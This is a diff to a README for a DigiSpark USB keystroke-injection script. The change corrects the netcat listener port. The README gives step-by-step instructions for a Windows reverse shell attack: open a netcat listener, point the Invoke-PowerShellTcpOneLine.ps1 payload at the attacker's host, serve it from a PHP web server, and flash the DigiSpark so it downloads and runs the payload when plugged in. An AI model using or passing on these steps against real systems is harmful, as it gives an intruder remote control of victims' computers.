@@ -3,7 +3,7 @@ This DigiSpark script downloads and executes the Invoke-PowerShellTcpOneLine.ps1
 
 ## Instructions:
   ### On the host machine (I assume you are using linux for this):
-  1. Open a netcat listener on a port (the script uses port 4444 by default): `nc -lp 444`
+  1. Open a netcat listener on a port (the script uses port 4444 by default): `nc -lp 4444`
   2. Download and modify the Invoke-PowerShellTcpOneLine.ps1 by removing the first line comment and changing the IP address to the one of your host machine and the port to the one you chose earlier.
   3. You now need to host the payload on a web server so it can be downloaded on the Windows computer. There are many ways to do this, but for anyone who wants a quick and easy solution you can host a php web server from the linux terminal like this: `sudo php -S 0.0.0.0:80 -t /directory/to/folder/of/powershellScript/`
   4. Download and edit the `Reverse_Shell.ino` DigiSpark script to match the address where the ps1 powershell script is hosted and compile and load `Reverse_Shell.ino` to your DigiSpark. 
